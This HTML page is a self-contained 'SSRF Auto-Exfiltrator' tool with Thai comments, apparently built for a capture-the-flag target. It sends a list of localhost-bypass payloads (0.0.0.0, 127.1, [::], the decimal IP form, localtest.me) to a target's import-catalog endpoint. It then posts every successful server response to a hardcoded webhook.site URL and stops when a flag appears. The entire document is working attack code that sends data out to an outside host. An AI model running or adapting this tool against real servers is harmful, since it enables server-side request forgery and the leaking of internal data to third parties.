<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Sacred Water SSRF to Webhook</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 5px; max-width: 800px; margin: auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; }
        #log { margin-top: 20px; height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🌊 SSRF Auto-Exfiltrator</h2>
        <label>Target IP/URL (Web Sacred Water):</label>
        <input type="text" id="target" placeholder="http://34.87.x.x:3000">
        <button onclick="startExploit()">START ATTACK & SEND TO WEBHOOK</button>
        <div id="log">Waiting for command...</div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
        
        // รายการ Bypass ที่เป็นไปได้ทั้งหมด
        const payloads = [
            "http://0.0.0.0/flag.txt",
            "http://127.1/flag.txt",
            "http://[::]/flag.txt",
            "http://0/flag.txt",
            "http://2130706433/flag.txt",
            "http://localtest.me/flag.txt",
            "http://127.0.0.1/flag.txt",
            "http://0.0.0.0/admin",
            "http://0.0.0.0/api/internal/flag.txt"
        ];

        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            l.scrollTop = l.scrollHeight;
        }

        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors', // เพื่อเลี่ยง CORS บน Webhook.site
                    body: JSON.stringify(data)
                });
            } catch (e) { console.error("Webhook error", e); }
        }

        async function startExploit() {
            const target = document.getElementById('target').value.trim();
            if(!target) return alert("กรุณาใส่ URL เป้าหมาย");

            log("🚀 เริ่มการโจมตี SSRF...");

            for (let url of payloads) {
                log(`กำลังลอง Payload: ${url}`);
                
                try {
                    const response = await fetch(`${target}/api/import-catalog`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ url: url })
                    });

                    const data = await response.json();

                    if (data.preview || data.message) {
                        log(`✅ สำเร็จ! กำลังส่งข้อมูลไปที่ Webhook...`);
                        
                        // ส่งผลลัพธ์ทั้งหมดไปที่ Webhook ทันที
                        await sendToWebhook({
                            payload_used: url,
                            http_status: response.status,
                            server_response: data
                        });

                        // ถ้าเจอ Flag ให้หยุดทันที
                        if (JSON.stringify(data).includes("web{")) {
                            log("🚩 เจอ FLAG แล้ว!!! ตรวจสอบที่ Webhook.site");
                            break;
                        }
                    } else {
                        log(`❌ Payload ${url} ถูกบล็อกหรือไม่มีไฟล์`);
                    }
                } catch (err) {
                    log(`⚠️ Error: ${err.message}`);
                }
            }
            log("🏁 การสแกนเสร็จสิ้น");
        }
    </script>
</body>
</html>
